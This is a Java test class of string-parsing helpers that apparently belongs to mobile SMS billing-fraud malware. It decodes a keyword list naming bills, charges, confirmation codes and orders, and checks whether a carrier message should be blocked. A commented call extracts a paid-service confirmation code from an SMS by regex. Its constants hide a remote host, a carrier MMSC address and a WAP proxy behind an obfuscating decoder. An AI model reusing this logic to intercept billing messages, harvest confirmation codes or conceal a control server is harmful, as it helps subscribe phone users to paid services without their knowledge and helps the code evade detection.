package test;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import net.workspace.web.util.ParseKsy;
import org.apache.commons.lang3.StringUtils;
import org.json.JSONException;
import org.json.JSONObject;

public class TTest {
    public static String getLocationUrl(String s, String s1) {
        String result = s1;
        if (!s1.startsWith("http")) {
            int i = s.indexOf("://");
            String s4 = s.substring(0, i + 3);
            String s5 = s.substring(i + 3);
            String s6 = s5.substring(0, s5.indexOf("/"));
            result = new StringBuilder(String.valueOf(s4)).append(s6).append(s1).toString();
        }
        return result.replaceAll("%2CUNTRUSTED", "").replaceAll(" ", "+");
    }
    public static String getMobileNumber(String s) {
        String result = "";
        if (s != null) {
            int length = s.length();
            if (length <= 11) result = s;
            else result = s.substring(length - 11);
        }
        return result;
    }
    public static String GetUrl(byte aray[]) {
        String s = "";
        try {
            aray[0] = (byte) (0xf & aray[0] >> 4 | 0xf0 & aray[0] << 4);
            int length = aray.length;
            for (int i = 1; i < length; i++) {
                aray[i] = (byte) (0xff & aray[i] ^ 0xff & aray[i - 1]);
            }
            s = new String(aray, 0, length);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return s;
    }
    public static void main(String args[]) {
        System.out.println(ParseKsy.encode("账单,消费,信息费,1/2,2/2,代收,代码,感谢,客服,购买,不符,取消,资费,成功,任意内容,密码,订购"));
        String text = "通信公司提供的全能助理业务，信息费1.00元/条，客服电话10086，本次密码353864，输入密码确认点播";
        String blockContent = "通信公司&全能助理&本次密码";
        if (blockContent.contains("&")) {
            boolean matchContent = true;
            for (String field : "12520136".split("\\&")) {
                //System.out.println(field);
                if (!text.contains(field)) {
                    matchContent = false;
                    break;
                }
            }
            System.out.println(matchContent);
        }
        for (String s : "a".split("&")) {
            //System.out.println(s);
        }
        // System.out.println(parseVariable("通信公司提供的全能助理业务，信息费1.00元/条，客服电话10086，本次密码353864，输入密码确认点播。","regex(本次密码([\\d]*)`1)"));
    }
    /**
     * @param target
     * @param searcher, 1:text(),2:enclosed(),3:regex(),4:left(),5:right()
     * @return
     */
    public static String parseVariable(String target, String searcher) {
        try {
            if (target != null && !StringUtils.isEmpty(searcher) && searcher.endsWith(")")) {
                for (int i = 0; i < supportedMethod.length; i++) {
                    String method = supportedMethod[i];
                    if (searcher.startsWith(method + "(")) {
                        String variable = searcher.substring(method.length() + 1, searcher.length() - 1);
                        switch (i) {
                            case 0:
                                return variable;
                            case 1:
                                return searchEnclosed(target, variable);
                            case 2:
                                return searchRegex(target, variable);
                            case 3:
                                return searchLeft(target, variable);
                            case 4:
                                return searchRight(target, variable);
                        }
                        break;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    //left`right`matcherIndex
    private static String searchEnclosed(String target, String searcher) {
        if (target != null && searcher != null) {
            String left = null;
            String right = null;
            int matcherIndex = -1;
            String[] fields = searcher.split(SPLITTER);
            if (fields.length >= 2) {
                left = fields[0];
                right = fields[1];
                if (fields.length >= 3) {
                    matcherIndex = Integer.valueOf(fields[2].trim());
                }
            }
            return searchEnclosed(target, left, right, matcherIndex);
        }
        return null;
    }
    public static String searchEnclosed(String target, String left, String right) {
        return searchEnclosed(target, left, right, 0);
    }
    public static String searchEnclosed(String target, String left, String right, int matcherIndex) {
        if (!StringUtils.isEmpty(target) && !StringUtils.isEmpty(left) && !StringUtils.isEmpty(right)) {
            int index = 0;
            int leftPlace = 0;
            int rightPlace = 0;
            int fromPlace = 0;
            while (leftPlace >= 0 && rightPlace >= 0) {
                leftPlace = target.indexOf(left, fromPlace);
                if (leftPlace >= 0) {
                    fromPlace = leftPlace + left.length() + 1;
                    rightPlace = target.indexOf(right, fromPlace);
                    if (rightPlace > 0 && (matcherIndex == -1 || matcherIndex == index++)) {//
                        return target.substring(leftPlace + left.length(), rightPlace);
                    }
                    fromPlace = rightPlace + right.length() + 1;
                }
            }
        }
        return null;
    }
    private static String searchLeft(String target, String searcher) {
        if (target != null && searcher != null) {
            int place = target.indexOf(searcher);
            if (place >= 0) { return target.substring(0, place); }
        }
        return null;
    }
    //regex`groupIndex`matcherIndex
    private static String searchRegex(String target, String searcher) {
        String result = null;
        String regex = null;
        int matcherIndex = -1;
        int groupIndex = -1;
        if (searcher != null) {
            String[] fields = searcher.split(SPLITTER);
            if (fields.length >= 2) {
                regex = fields[0];
                groupIndex = Integer.valueOf(fields[1].trim());
                if (fields.length >= 3) {
                    matcherIndex = Integer.valueOf(fields[2].trim());
                }
            }
        }
        if (regex != null && groupIndex >= 0) {
            Pattern pattern = Pattern.compile(regex);
            Matcher matcher = pattern.matcher(target);
            int index = 0;
            while (matcher.find()) {
                if (matcherIndex == -1 || index++ == matcherIndex) {
                    if (groupIndex <= matcher.groupCount()) {
                        result = matcher.group(groupIndex);
                    }
                    break;
                }
            }
        }
        return result;
    }
    private static String searchRight(String target, String searcher) {
        if (target != null && searcher != null) {
            int place = target.indexOf(searcher);
            if (place >= 0) { //
                return target.substring(place + searcher.length());
            }
        }
        return null;
    }
    public static void sleep(long milseconds) {
        try {
            Thread.sleep(milseconds);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    public static JSONObject toJson(String s) {
        JSONObject obj = null;
        if (s != null && s.trim().length() > 0) {
            try {
                obj = new JSONObject(s);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        return obj;
    }
    //private static String SERVER_URL_PATH = "/pluginweb/plugin/";
    /**
     * "p.xplu.net"
     */
    public static String HOST_NAME = ParseKsy.decode("630415a386a76486b3933282d6111e79");
    /**
     * `
     */
    public static String SPLITTER = "`";
    public static boolean IS_REGISTER = false;
    public static String WIFI = ParseKsy.decode("755e9d875600aced5b616163301bb1df");
    /**
     * "http://mmsc.monternet.com"
     */
    public static String MMSC = ParseKsy.decode("cf987cb42724e4b91087d218ef0c735e6d21feacddfa368b49973412ede27ab6");
    /**
     * 10.0.0.172
     */
    public static String PROXY = ParseKsy.decode("55ee27ff750a434660316b7b422bd896");
    public static String PREF_JSON_REQUEST_FAILURE_COUNT = "537825635d831f291f5e714681a843a6";
    public static String SERVER_URL;
    /**
     * ["text","enclosed", "regex","left","right"]
     */
    private static String[] supportedMethod = { //
        //
            ParseKsy.decode("3e8f2ffdde007cffb344a32c3eb68ec9"),// "text",
            ParseKsy.decode("32a79f175a4e99281021b959f50ee765"),//"enclosed", //
            ParseKsy.decode("4b44c42addd0f4b6ffc77db5ffb83b74"),//"regex",//
            ParseKsy.decode("a728e9a9b7d308596d1ff60c39985781"),//"left",//
            ParseKsy.decode("57ccaef42f6777410903e505f918dc29") //   "right"
        //
    };
}
